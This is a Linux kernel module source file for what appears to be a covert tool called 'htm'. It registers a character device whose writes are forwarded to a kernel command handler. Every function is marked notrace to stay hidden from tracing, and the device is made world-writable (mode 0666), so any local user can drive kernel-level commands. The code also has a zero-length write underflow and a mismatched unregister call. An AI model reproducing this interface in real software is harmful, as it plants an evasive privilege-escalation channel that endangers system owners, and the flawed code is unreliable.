#include <linux/kernel.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

#include "command.h"
#include "config.h"
#include "htm.h"
#include "cdd.h"

#define STATUS_NONE 0
#define STATUS_OK 1
#define STATUS_ERR 2

static size_t _len_data = 0;
static uint8_t _data[HTM_MAX_WRITE_CDD];

static int _cdev_major = 0;
static int _last_status = STATUS_NONE;

static struct cdev _cdev;
static struct class *_cdev_class = NULL;

static struct file_operations cdev_fops;

static notrace int _cdev_uevent(const struct device *dev, struct kobj_uevent_env *env)
{
	add_uevent_var(env, "DEVMODE=%#o", 0666);
	return 0;
}

static notrace int _cdev_open(struct inode *inode, struct file *file)
{
	return 0;
}

static notrace long _cdev_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
	return 0;
}

static notrace ssize_t _cdev_read(struct file *file, char __user *buf, size_t len, loff_t *offset)
{
	size_t ret;

	if (_last_status == STATUS_NONE)
		return 0;

	if (_last_status == STATUS_OK) {
		_len_data = 39;

		strncpy(
			(char *)_data, "[htm] Operation completed successfully\n",
			HTM_MAX_WRITE_CDD
		);
	}
	else
	if (_last_status == STATUS_ERR) {
		_len_data = 23;
		strncpy((char *)_data, "[htm] Operation failed\n", HTM_MAX_WRITE_CDD);
	}

	_last_status = STATUS_NONE;

	if ((ret = copy_to_user(buf, _data, _len_data))) {
		ret = _len_data - ret;

		#ifdef HTM_DEBUG
		htm_pr_notice("copy_to_user only copied %lu/%lu bytes", ret, _len_data);
		#endif

		_len_data = 0;
		return ret;
	}

	ret = _len_data;
	_len_data = 0;

	return ret;
}

static notrace ssize_t _cdev_write(struct file *file, const char __user *buf, size_t len, loff_t *offset)
{
	size_t ret;
	uint8_t data[HTM_MAX_WRITE_CDD];

	if (len > HTM_MAX_WRITE_CDD) {
		#ifdef HTM_DEBUG
		htm_pr_warn("write size > %u - will not execute", HTM_MAX_WRITE_CDD);
		#endif

		_last_status = STATUS_ERR;
		return len;
	}

	if ((ret = copy_from_user(data, buf, len))) {
		#ifdef HTM_DEBUG
		htm_pr_warn("only %lu bytes were copied - will not execute", ret);
		#endif

		_last_status = STATUS_ERR;
		return len;
	}

	data[len - 1] = 0x00;
	_last_status = htm_command((char *)data, NULL) ? STATUS_ERR : STATUS_OK;

	return len;
}

static notrace int _cdev_release(struct inode *inode, struct file *file)
{
	return 0;
}

// Create character device
notrace int htm_cdd_create(void)
{
	int ret;
	dev_t dev;

	if (_cdev_major) {
		#ifdef HTM_DEBUG
		htm_pr_warn(
			"character device already enabled: %s (major %d, minor %d)",
			"/dev/" HTM_CDD_NAME, _cdev_major, MINOR(_cdev.dev)
		);
		#endif

		return -EINVAL;
	}

	cdev_fops.open = _cdev_open;
	cdev_fops.unlocked_ioctl = _cdev_ioctl;
	cdev_fops.read = _cdev_read;
	cdev_fops.write = _cdev_write;
	cdev_fops.release = _cdev_release;
	cdev_fops.owner = THIS_MODULE;

	if ((ret = alloc_chrdev_region(&dev, 0, 1, HTM_CDD_NAME))) {
		#ifdef HTM_DEBUG
		htm_pr_err("alloc_chrdev_region failed");
		#endif

		return ret;
	}

	_cdev_major = MAJOR(dev);

	_cdev_class = class_create(HTM_CDD_NAME);
	_cdev_class->dev_uevent = _cdev_uevent;

	cdev_init(&_cdev, &cdev_fops);
	_cdev.owner = THIS_MODULE;

	cdev_add(&_cdev, MKDEV(_cdev_major, 0), 1);
	device_create(_cdev_class, NULL, MKDEV(_cdev_major, 0), NULL, HTM_CDD_NAME);

	#ifdef HTM_DEBUG
	htm_pr_notice(
		"created character device: %s (major %d, minor %d)",
		"/dev/" HTM_CDD_NAME, _cdev_major, MINOR(_cdev.dev)
	);
	#endif

	return 0;
}

notrace int htm_cdd_destroy(void)
{
	if (! _cdev_major) {
		#ifdef HTM_DEBUG
		htm_pr_warn("character device not enabled");
		#endif

		return -EINVAL;
	}

	device_destroy(_cdev_class, MKDEV(_cdev_major, 0));
	class_destroy(_cdev_class);
	unregister_chrdev_region(MKDEV(_cdev_major, 0), MINORMASK);

	#ifdef HTM_DEBUG
	htm_pr_notice("removed character device: %s", "/dev/" HTM_CDD_NAME);
	#endif

	_cdev_major = 0;

	return 0;
}
